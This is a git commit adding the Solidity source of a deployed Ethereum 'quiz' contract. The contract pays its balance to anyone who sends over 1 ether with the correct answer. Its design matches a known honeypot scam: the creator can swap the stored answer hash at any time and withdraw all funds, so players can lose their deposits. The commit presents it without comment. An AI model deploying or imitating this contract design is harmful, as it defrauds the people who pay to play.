ee22d33fee391c1faeb820e3bf622cc8fabd1d7d
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-18 06:01:10 +0700

    add contract quiz_qz

---
+++ quiz_qz.sol
@@ -0,0 +1,61 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract quiz_qz at 0x46DE9ef59a51388961BfBe45Fb89bEdbDFaa32ac
+*/
+pragma solidity ^0.4.20;
+
+contract quiz_qz
+{
+    function Try(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    string public question;
+ 
+    address questionSender;
+  
+    bytes32 responseHash;
+ 
+    function Start_quiz_qz(string _question,string _response)
+    public
+    payable
+    {
+        if(responseHash==0x0)
+        {
+            responseHash = keccak256(_response);
+            
+            question = _question;
+            
+            questionSender = msg.sender;
+        }
+    }
+    
+    function StopGame()
+    public
+    payable
+    {
+       require(msg.sender==questionSender);
+       
+       msg.sender.transfer(this.balance);
+    }
+    
+    function NewQuestion(string _question, bytes32 _responseHash)
+    public
+    payable
+    {
+        require(msg.sender==questionSender);
+        
+        question = _question;
+        
+        responseHash = _responseHash;
+    }
+    
+    function() public payable{}
+}
